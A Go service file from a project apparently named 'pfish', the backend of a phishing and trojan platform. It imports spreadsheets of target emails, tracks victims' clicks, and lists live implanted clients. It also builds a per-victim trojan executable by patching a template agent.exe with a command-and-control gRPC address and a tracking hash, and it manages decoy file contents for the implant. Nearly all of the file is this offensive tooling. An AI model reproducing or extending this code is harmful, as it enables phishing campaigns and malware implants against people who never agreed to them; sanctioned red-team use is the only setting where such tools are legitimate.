package service

import (
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/pow1e/pfish/config"
	"github.com/pow1e/pfish/pkg/database"
	"github.com/pow1e/pfish/pkg/file"
	"github.com/pow1e/pfish/pkg/model"
	"github.com/pow1e/pfish/pkg/model/common"
	"github.com/pow1e/pfish/pkg/model/request"
	"github.com/pow1e/pfish/pkg/model/response"
	"github.com/pow1e/pfish/pkg/utils"
	"github.com/sirupsen/logrus"
	"github.com/xuri/excelize/v2"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

const (
	errCode     = 500
	successCode = 200
)

const (
	grpcServer = "exmpaleGrpcServerAddressABCDEFGH"
	md5        = "exampleMD51234567891234567891234"
)

// GetMessage 根据邮箱md5(2次) 获取当前用户所有点击记录
func GetMessage(c *gin.Context) {
	// 32位小数
	md5String := c.Param("md5")
	pageString := c.DefaultQuery("page", "1")
	pageSizeString := c.DefaultQuery("pageSize", "50")

	// 转换分页参数为整数
	page, err := strconv.Atoi(pageString)
	if err != nil || page < 1 {
		page = 1 // 如果页码参数不合法，则默认为第1页
	}

	pageSize, err := strconv.Atoi(pageSizeString)
	if err != nil || pageSize < 1 {
		pageSize = 50 // 如果每页数量不合法，则默认为50
	}

	if md5String == "" {
		// md5值为空
		response.FailWithMessage(c, "邮箱md5错误/md5不存在")
		return
	}

	logrus.Info("获取到md5", md5String)

	// 查询md5值是否存在
	var user *model.User
	user, err = database.FindUserByEmailMD5(md5String)
	if err != nil {
		response.FailWithMessage(c, err.Error())
		return
	}

	// 查询message
	var messages []*model.Message
	// 计算偏移量
	offset := (page - 1) * pageSize
	messages, err = database.FindMessageByUidPage(user.ID, offset, pageSize)
	if err != nil {
		// 查询邮箱点击信息出错
		response.FailWithMessage(c, err.Error())
		return
	}

	var respMessage string
	if len(messages) == 0 {
		respMessage = "暂无点击信息，请耐心等待~"
	} else {
		respMessage = fmt.Sprintf("查询成功，返回当前邮箱%s点击信息，注意图片路径不要随便乱传(每个图片路径携带唯一标识，不存在未授权访问)", user.Email)
	}

	// 动态替换pass
	for i, message := range messages {
		messages[i].Picture = strings.Replace(
			message.Picture,
			"{pass}",
			config.Conf.Server.Pass,
			-1, // 替换所有匹配的 `{pass}`
		)
	}

	response.OkWithDetail(c, respMessage, gin.H{
		"message":  messages,
		"count":    len(messages),
		"page":     page,
		"pageSize": pageSize,
	})
}

// ImportExcel 导入excel 并且解析到数据库
func ImportExcel(c *gin.Context) {
	uploadFile, err := c.FormFile("file")
	if err != nil {
		response.FailWithMessage(c, err.Error())
		return
	}

	// 获取文件名
	if path.Ext(uploadFile.Filename) != ".xlsx" {
		response.FailWithMessage(c, "上传文件失败，只能上传xlsx后缀的文件")
		return
	}

	// 保存文件到临时目录
	tempFile := filepath.Join(os.TempDir(), uploadFile.Filename)
	if err := c.SaveUploadedFile(uploadFile, tempFile); err != nil {
		response.FailWithMessage(c, "保存文件失败")
		return
	}
	defer os.Remove(tempFile)

	// 打开 Excel 文件
	f, err := excelize.OpenFile(tempFile)
	if err != nil {
		logrus.Errorf("打开 Excel 文件失败: %v", err)
		response.FailWithMessage(c, "解析文件失败，请上传正确的 Excel 文件")
		return
	}

	// 提取所有邮件地址
	var emails []string
	re := regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)

	// 遍历所有 Sheet 和单元格
	for _, sheet := range f.GetSheetList() {
		rows, err := f.GetRows(sheet)
		if err != nil {
			logrus.Errorf("读取 Sheet '%s' 失败: %v", sheet, err)
			continue
		}
		for _, row := range rows {
			for _, cell := range row {
				if re.MatchString(cell) {
					emails = append(emails, cell)
				}
			}
		}
	}

	// 返回结果
	if len(emails) == 0 {
		response.FailWithMessage(c, "钓鱼邮件列表为空，请通过excel文件导入对应的钓鱼邮箱")
		return
	}

	// 写入数据库
	users := make([]*model.User, 0)
	for _, email := range emails {
		users = append(users, &model.User{
			ID:    uuid.NewString(),
			Name:  strings.Split(email, "@")[0], // 以邮箱@前面作为姓名
			Email: email,
			MD5:   utils.MD5(utils.MD5(email) + config.Conf.Server.Salt), // 两次md5
		})
	}

	if err = database.DB.CreateInBatches(users, 100).Error; err != nil {
		logrus.Error("批量插入数据错误:", err)
		response.FailWithMessage(c, "批量新增用户出错，请删除数据后重试")
		return
	}

	response.OkWithDetail(c, "解析文件成功", gin.H{
		"emails": emails,
		"count":  len(emails),
	})
}

// ExportMessage 导出用户点击信息
// email为邮件md5两次的结果
func ExportMessage(c *gin.Context) {
	emailMD5 := c.DefaultQuery("emailMD5", "")
	// 根据邮箱导出
	if emailMD5 != "" {
		// 查询出当前的id
		user, err := database.FindUserByEmailMD5(emailMD5)
		if err != nil {
			response.FailWithMessage(c, err.Error())
			return
		}

		// 根据id查询message
		messages, err := database.FindAllMessagesByUid(user.ID)
		if err != nil {
			response.FailWithMessage(c, err.Error())
			return
		}
		// 动态修改pass
		for i, message := range messages {
			messages[i].Picture = strings.Replace(
				message.Picture,
				"{pass}",
				config.Conf.Server.Pass,
				-1, // 替换所有匹配的 `{pass}`
			)
		}
		file.OutputMessagesToExcel(c, messages, user.Email)
		return
	}

	// 导出所有
	var messages []*model.Message
	if err := database.DB.Find(&messages).Error; err != nil {
		response.FailWithMessage(c, "查询所有用户点击信息出错")
		return
	}

	// 动态替换pass
	for i, message := range messages {
		messages[i].Picture = strings.Replace(
			message.Picture,
			"{pass}",
			config.Conf.Server.Pass,
			-1, // 替换所有匹配的 `{pass}`
		)
	}

	file.OutputMessagesToExcel(c, messages)
}

func SendEmail(c *gin.Context) {

}

func Alive(c *gin.Context) {
	// 获取路径参数 md5
	md5String := c.Param("md5")

	if md5String != "" {
		md5String = md5String[1:] // 去掉开头的斜杠
	}

	// 获取存活客户端
	clients := common.GlobalAliveUsers.GetClients()
	var aliveResp = make(map[string]string)

	// 如果未传 md5 参数，返回所有存活客户端
	if md5String == "" {
		for emailMd5 := range clients {
			user, err := database.FindUserByEmailMD5(emailMd5)
			if err != nil {
				logrus.Errorf("查询用户信息出错: %v", err)
				c.JSON(http.StatusOK, &response.Response{
					Code: errCode,
					Msg:  err.Error(),
				})
				return
			}
			aliveResp[user.Name] = user.Email
		}
		c.JSON(http.StatusOK, &response.Response{
			Code: successCode,
			Msg:  "获取存活客户端成功",
			Data: gin.H{
				"count":   len(aliveResp), // 客户端数量
				"clients": aliveResp,      // 客户端详情
			},
		})
		return
	}

	// 如果传了 md5 参数，查询对应客户端
	client, exists := clients[md5String]
	if !exists {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "探活失败，未找到该客户端",
		})
		return
	}

	// 返回单个客户端的信息
	user, err := database.FindUserByEmailMD5(md5String)
	if err != nil {
		logrus.Errorf("查询用户信息出错: %v", err)
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  err.Error(),
		})
		return
	}
	c.JSON(http.StatusOK, &response.Response{
		Code: successCode,
		Msg:  "探活成功",
		Data: gin.H{
			"active": client.Active,
			"user":   user.Name,
			"email":  user.Email,
		},
	})
}

// GenerateAgent 生成木马
func GenerateAgent(c *gin.Context) {
	// 默认不使用模板
	var req request.GenerateAgentReq
	if err := c.ShouldBind(&req); err != nil {
		response.FailWithMessage(c, err.Error())
		return
	}
	// 判断grpc服务是否为空 如果为则使用配置文件中的
	if req.GrpcServerAddr == "" {
		req.GrpcServerAddr = fmt.Sprintf("%s:%s", config.Conf.Server.IP, config.Conf.Server.GRPC.Port)
	}

	// 不重新构建 则直接修改可执行文件 替换对应的grpc服务和邮箱
	if !req.Rebuild {
		if err := modifyExecutableFile(&req); err != nil {
			response.FailWithMessage(c, err.Error())
			return
		}
		response.OkWithDetail(c, "生成成功", gin.H{})
		return
	}

	// todo 添加多个上线模板
	// 判断平台
	if req.Platform != "windows" && req.Platform != "linux" && req.Platform != "darwin" {
		response.FailWithMessage(c, "请填写windows|linux|darwin")
		return
	}
	if req.Arch != "x86" {
		response.FailWithMessage(c, "请填写x86")
		return
	}

	c.Data(http.StatusOK, "application/octet-stream", []byte("hello"))
}

func modifyExecutableFile(req *request.GenerateAgentReq) error {
	// key为email 值为md5
	modifyExecutableMap := make(map[string]string)
	var users []model.User
	if err := database.DB.Find(&users).Error; err != nil {
		return errors.New("查询邮箱失败，请重试")
	}

	for _, user := range users {
		modifyExecutableMap[user.Email] = user.MD5
	}

	// 查询当前邮件是否存在
	for _, email := range req.Emails {
		if _, ok := modifyExecutableMap[email]; !ok {
			return fmt.Errorf("当前邮件%s不存在，请重新填写", email)
		}
	}

	// 遍历生成对应的agent
	for _, email := range req.Emails {
		// 读取模板文件
		data, err := os.ReadFile("./template/agent.exe")
		if err != nil {
			logrus.Error("读取/template/agent.exe失败:", err)
			return err
		}

		// 判断传入的字符串是否超过32位
		var (
			modifyGrpcServer = []byte(base64.StdEncoding.EncodeToString([]byte(req.GrpcServerAddr)))
			modifyMD5        = []byte(modifyExecutableMap[email])
		)

		if modifyGrpcServer, err = utils.CheckByteLength([]byte(grpcServer), modifyGrpcServer); err != nil {
			return err
		}
		data = bytes.Replace(data, []byte(grpcServer), modifyGrpcServer, -1)

		// 获取email对应的加盐md5
		if modifyMD5, err = utils.CheckByteLength([]byte(md5), modifyMD5); err != nil {
			return err
		}

		data = bytes.Replace(data, []byte(md5), modifyMD5, -1)
		// 生成新的文件路径
		generateAgentName := fmt.Sprintf("%s_agent.exe", email)

		// 写入新的 exe 文件
		err = ioutil.WriteFile(generateAgentName, data, 0644)
		if err != nil {
			log.Fatalf("无法写入文件: %v", err)
		}
		fmt.Printf("替换成功，生成新的 exe 文件: %s\n", generateAgentName)
	}

	return nil
}

// CreateAgentConfig 创建马子相关配置(打开文件名，文件内容)
func CreateAgentConfig(c *gin.Context) {
	openFileName := c.PostForm("open_file_name")

	// 获取文件
	content, err := c.FormFile("content")
	if err != nil {
		response.FailWithMessage(c, "文件上传失败，请重试")
		return
	}

	// 校验参数
	if content == nil {
		response.FailWithMessage(c, "文件上传失败，请重试")
		return
	}

	templateFile, err := content.Open()

	if err != nil {
		response.FailWithMessage(c, "文件读取失败，请重试")
		return
	}

	contentBytes, err := io.ReadAll(templateFile)
	if err != nil {
		response.FailWithMessage(c, "文件读取失败，请重试")
		return
	}

	if utils.GetFileExt(openFileName) == "" {
		response.FailWithMessage(c, "文件后缀不能为空")
		return
	}

	var conf = &model.AgentConfig{
		TemplateID:   uuid.NewString(),
		OpenFileName: openFileName,
		Content:      contentBytes,
		CreatedAt:    time.Now(),
	}
	// 往数据库添加数据
	if err = database.DB.Create(conf).Error; err != nil {
		response.FailWithMessage(c, "添加配置失败")
		return
	}

	var resp = response.CreateAgentConfigResp{
		TemplateID:   conf.TemplateID,
		OpenFileName: conf.OpenFileName,
		CreatedAt:    conf.CreatedAt,
	}
	response.OkWithDetail(c, "创建配置成功", resp)
	return
}

// UpdateAgentConfig 修改agent相关配置
func UpdateAgentConfig(c *gin.Context) {
	// 根据template_id修改agent相关配置 不为空则进行修改
	openFileName := c.PostForm("open_file_name")
	templateId := c.PostForm("template_id")

	// 获取文件
	content, _ := c.FormFile("content")

	if templateId == "" {
		response.FailWithMessage(c, "模板id不能为空，请重试")
		return
	}

	// 查询是否该模板
	var updateConfig model.AgentConfig
	if err := database.DB.Where("template_id = ?", templateId).First(&updateConfig).Error; err != nil {
		response.FailWithMessage(c, "查询模板id失败，请重试")
		return
	}

	// 文件名不为空则进行修改
	if openFileName != "" {
		updateConfig.OpenFileName = openFileName
	}

	// 文件内容不为空则进行修改
	if content != nil {
		templateFile, err := content.Open()
		if err != nil {
			response.FailWithMessage(c, "读取文件内容失败，请重试")
			return
		}

		contentBytes, err := io.ReadAll(templateFile)
		if err != nil {
			response.FailWithMessage(c, "读取文件内容失败，请重试")
			return
		}

		updateConfig.Content = contentBytes
	}

	if err := database.DB.Model(&model.AgentConfig{}).
		Where("template_id = ?", templateId).
		Updates(updateConfig).
		Error; err != nil {
		response.FailWithMessage(c, "修改配置失败，请重试")
		return
	}

	response.OkWithMessage(c, "修改配置成功")
}

func DeleteAgentConfig(c *gin.Context) {
	type deleteAgentConfig struct {
		TemplateID string `json:"template_id"`
	}
	var req deleteAgentConfig
	if err := c.ShouldBind(&req); err != nil {
		response.FailWithMessage(c, err.Error())
		return
	}

	if req.TemplateID != "" {
		if err := database.DB.Where("template_id = ?", req.TemplateID).Delete(&model.AgentConfig{}).Error; err != nil {
			response.FailWithMessage(c, "删除配置失败，请重试")
			return
		}
	}

	response.OkWithMessage(c, "删除成功")
}
